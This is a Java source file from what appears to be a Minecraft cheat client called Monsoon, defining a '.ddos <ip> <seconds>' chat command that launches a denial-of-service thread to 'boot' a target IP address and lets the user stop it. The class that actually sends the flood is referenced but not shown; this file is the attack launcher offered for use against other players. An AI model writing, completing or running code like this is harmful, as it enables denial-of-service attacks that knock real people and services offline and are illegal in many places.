package dev.monsoon.command.impl.dos;

import dev.monsoon.Monsoon;
import dev.monsoon.command.Command;
import org.lwjgl.Sys;

public class DDoS extends Command {

    private DOSExecuter dosThread;

    public DDoS() {
        super("DDoS", "Attempt to boot an IP address", ".ddos <ip> <seconds>", ".boot", ".dos");
    }

    @Override
    public void onCommand(String[] args, String command) {
        //Monsoon.sendMessage(args.length + "");
        if(args[0].equalsIgnoreCase("start")) {
            if (args.length >= 3) {
                try {
                    dosThread = new DOSExecuter(args[1], Integer.parseInt(args[2]));
                } catch (NumberFormatException e) {
                    Monsoon.sendNotif("DDoS","Please give a valid number of seconds!");
                }

                try {
                    dosThread.run();
                    Monsoon.sendNotif("DDoS", "Attempting to boot " + args[1]);
                } catch (NullPointerException e) {
                    Monsoon.sendNotif("DDoS","Thread is null. You probably stopped the attack.");
                }
            }
        } else if(args[0].equalsIgnoreCase("stop")) {
            dosThread = null;
            Monsoon.sendNotif("DDoS","Stopping...");
        }
    }
}
